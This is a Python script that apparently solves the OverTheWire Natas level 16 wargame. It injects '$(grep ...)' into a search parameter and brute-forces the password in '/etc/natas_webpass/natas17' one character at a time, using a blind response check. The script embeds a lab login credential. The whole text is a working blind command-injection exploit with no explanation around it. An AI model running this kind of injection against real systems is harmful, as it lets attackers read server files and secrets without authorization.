import requests
from requests.auth import HTTPBasicAuth

alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
flag = ""
try:
	print("\nStart...\n")
	for _ in range(0, 32):
		for ch in alpha:
			query = "$(grep ^" + flag + ch + " /etc/natas_webpass/natas17)British"
			resp = requests.get("http://natas16.natas.labs.overthewire.org/?needle={}".format(query), auth=HTTPBasicAuth("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"))
			if "British" not in resp.text:
				flag += ch
				print(flag)
				break
	print("\nFinished\n")
except:
	exit(0)
